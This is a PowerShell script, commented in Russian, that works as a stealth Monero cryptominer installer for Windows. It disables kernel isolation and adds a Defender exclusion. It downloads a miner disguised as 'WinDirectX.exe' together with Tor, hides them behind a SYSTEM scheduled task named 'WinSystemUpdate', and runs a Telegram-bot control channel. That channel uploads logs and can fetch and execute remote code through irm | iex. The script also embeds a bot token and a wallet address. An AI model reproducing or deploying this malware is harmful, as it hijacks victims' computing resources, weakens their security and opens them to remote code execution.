# =========================================================
# IMAMALIEV ENGINE - ULTIMATE CONTROL (v15.6.9)
# CPU OPTIMIZED: Intel Core i5-10400 (Threads: 6)
# =========================================================

# 1. ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# 2. НАСТРОЙКА СРЕДЫ + TLS 1.2
$currentVersion = "15.6.9"
Set-ExecutionPolicy Bypass -Scope Process -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Выключаем HVCI (Изоляцию ядра)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue

# 3. КОНФИГУРАЦИЯ И РАНДОМНОЕ ИМЯ
$path = "C:\ProgramData\SystemLib"
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }

$idFile = "$path\worker_id.txt"
if (!(Test-Path $idFile)) {
    $rand = Get-Random -Minimum 100 -Maximum 999
    $workerName = "EMAX-$rand"
    $workerName | Out-File -FilePath $idFile -Encoding ascii
} else {
    $workerName = (Get-Content $idFile).Trim()
}

$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA"
$user = "Isfandiyor0112-star"
$tgToken = "8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE"
$chatId = "6881699459"

# 4. ИНЪЕКЦИЯ В ПРОФИЛЬ
$profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
if (!(Test-Path (Split-Path $profilePath))) { New-Item -Type Directory -Path (Split-Path $profilePath) -Force | Out-Null }

$Functions = @"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
function check {
    `$p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
    Write-Host "Воркер: $workerName | v$currentVersion" -ForegroundColor Cyan
    if(`$p){ Write-Host "✅ СТАТУС: ОК" -ForegroundColor Green } else { Write-Host "❌ СТАТУС: OFF" -ForegroundColor Red }
}
function log { Get-Content "$path\miner.log" -Tail 50 -Wait }
"@
$Functions | Out-File -FilePath $profilePath -Force -Encoding utf8

# 5. АНТИ-СОН И ИСКЛЮЧЕНИЯ
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
powercfg /x -hibernate-timeout-ac 0
powercfg /x -standby-timeout-ac 0
powercfg /x -monitor-timeout-ac 5

# 6. ЗАГРУЗКА КОМПОНЕНТОВ (GITHUB -> EXE)
$files = @{ "WinDirectX.exe" = "WinDirectX"; "tor.exe" = "tor" }
foreach ($file in $files.Keys) {
    $target = "$path\$file"
    if (!(Test-Path $target)) {
        try {
            Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/$($files[$file])" -OutFile $target -UserAgent "Mozilla/5.0"
        } catch { }
    }
}

# 7. СКРЫТЫЙ ЗАПУСК (i5-10400: 6 потоков)
$cmd = "@echo off`ntasklist /FI `"IMAGENAME eq WinDirectX.exe`" | find /I `"WinDirectX.exe`" >NUL`nif %ERRORLEVEL%==0 exit`ntimeout /t 30 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $workerName --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii

$vbs = "Set W = CreateObject(`"WScript.Shell`")`nW.Run `"$path\tor.exe`", 0, False`nW.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 8. ПЛАНИРОВЩИК
Register-ScheduledTask -TaskName "WinSystemUpdate" -Action (New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$path\win_start.vbs`"") -Trigger (New-ScheduledTaskTrigger -AtStartup) -User "SYSTEM" -RunLevel Highest -Force

# 9. МОНИТОРИНГ С ВКЛЮЧЕННЫМ TLS 1.2 ВНУТРИ JOB
if (!(Get-Process "WinDirectX" -ErrorAction SilentlyContinue)) { Start-Process -FilePath "$path\win_start.vbs" }

$MonitorJob = {
    param($tgToken, $chatId, $path, $user, $currentVersion, $workerName)
    # КРИТИЧНО: Включаем TLS 1.2 внутри фонового задания
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    $lastUpdateId = 0
    while($true) {
        try {
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
            foreach ($upd in $updates.result) {
                $lastUpdateId = $upd.update_id
                $msgText = $upd.message.text.ToLower().Trim()
                if ($upd.message.chat.id -eq $chatId) {
                    
                    if ($msgText -eq "check") {
                        $cpu = (Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average
                        $p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
                        $msg = "[ $workerName ]`n✅ СТАТУС: " + (if($p){"ОК"}else{"OFF"}) + "`n💻 ЦП: $cpu%`n🔖 v$currentVersion"
                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage" -Method Post -Body @{ chat_id = $chatId; text = $msg }
                    }

                    if ($msgText -startsWith "log ") {
                        if ($msgText.Replace("log ","").ToUpper() -eq $workerName.ToUpper()) {
                            curl.exe -X POST "https://api.telegram.org/bot$tgToken/sendDocument?chat_id=$chatId" -F "document=@$path\miner.log"
                        }
                    }

                    if ($msgText -startsWith "delete ") {
                        if ($msgText.Replace("delete ","").ToUpper() -eq $workerName.ToUpper()) {
                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage" -Method Post -Body @{ chat_id = $chatId; text = "[$workerName]: ⚠️ УДАЛЕНИЕ..." }
                            Stop-Process -Name "WinDirectX", "tor" -Force -ErrorAction SilentlyContinue
                            Unregister-ScheduledTask -TaskName "WinSystemUpdate" -Confirm:$false -ErrorAction SilentlyContinue
                            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 1 -ErrorAction SilentlyContinue
                            Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage" -Method Post -Body @{ chat_id = $chatId; text = "[$workerName]: ✅ Удалено. Изоляция ядра ВКЛ." }
                            return
                        }
                    }

                    if ($msgText -eq "update") {
                        powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/$user/sminers/main/win_utility2.ps1' | iex"
                        return
                    }
                }
            }
        } catch {}
        if (!(Get-Process "WinDirectX" -ErrorAction SilentlyContinue)) { Start-Process -FilePath "$path\win_start.vbs" }
        Start-Sleep -Seconds 30
    }
}
Start-Job -ScriptBlock $MonitorJob -ArgumentList $tgToken, $chatId, $path, $user, $currentVersion, $workerName

# Старт
Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage" -Method Post -Body @{chat_id=$chatId; text="[$workerName]: 🚀 СИСТЕМА АКТИВИРОВАНА (v$currentVersion)"}
Write-Host "--- Готов: $workerName ---" -ForegroundColor Magenta
